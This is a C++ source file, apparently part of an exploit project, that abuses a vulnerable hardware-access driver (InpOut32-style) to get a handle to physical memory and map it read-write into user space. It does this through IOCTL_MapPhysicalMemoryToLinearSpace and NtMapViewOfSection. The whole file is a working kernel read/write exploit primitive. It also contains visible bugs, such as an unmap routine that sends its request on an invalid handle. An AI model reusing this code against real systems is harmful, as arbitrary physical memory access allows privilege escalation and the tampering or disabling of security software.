#include "rw_primitive.h"
#include "windows_helper_functions.h"

using myNtMapViewOfSection = NTSTATUS(NTAPI*)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD64 InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);
myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));

using myNtUnmapViewOfSection = NTSTATUS(NTAPI*)(
	HANDLE SectionHandle,
	PVOID BaseAddress
	);
myNtUnmapViewOfSection fNtUnmapViewOfSection = (myNtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));


BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, __int64 Address, SIZE_T Length, PDWORD64 VirtualAddress)
{
	NTSTATUS			ntStatus;
	PHYSICAL_ADDRESS	SectionOffset;
	SectionOffset.QuadPart = (ULONGLONG)(Address);
	*VirtualAddress = 0;
	ntStatus = fNtMapViewOfSection // maybe wrong function call?
	(
		PhysicalMemory,
		GetCurrentProcess(),
		(PVOID*)VirtualAddress,
		0L,
		Length,
		&SectionOffset,
		&Length,
		2,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(ntStatus)) return false;
	return true;
}

NTSTATUS UnmapPhysicalMemory(IOCTL_buffer* buffer) {
	HANDLE device2 = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;
	DWORD bytesReturned = 0;


	printf("[ ] Calling UnmapPhysicalMemory\n");
	status = DeviceIoControl(device2, IOCTL_UnmapPhysicalMemory, buffer,
		sizeof(buffer), buffer, 0, &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] UnmapPhysicalMemory failed with %X\n", status);
		return EXIT_FAILURE;
		//https://github.com/ellysh/InpOut32/blob/master/driver/hwinterfacedrv.c
	}
	printf("[*] UnmapPhysicalMemory 0x%X called successfully\n", IOCTL_UnmapPhysicalMemory);
	printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", bytesReturned, bytesReturned);

	return status;
}

// returns 0 on success and saves handle to hPhysicalMemory
// return -1 on failure
int GetDevicePhysicalMemoryHandle(LPCWSTR driverName, HANDLE* hPhysicalMemory) {
	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;
	DWORD bytesReturned = 0;


	device = CreateFileW(driverName, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "[!] Could not open device: 0x%X\n", GetLastError());
		CloseHandle(device);
		return -1;
	}

	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device,
		IOCTL_MapPhysicalMemoryToLinearSpace,
		&hPhysicalMemory,
		sizeof(hPhysicalMemory),
		&hPhysicalMemory,
		sizeof(hPhysicalMemory),
		&bytesReturned,
		(LPOVERLAPPED)NULL);

	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
		CloseHandle(device);
		return -1;
	}


	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("[*] Buffer from the kernel land: %p", hPhysicalMemory);
	CloseHandle(device);

	return 0;
}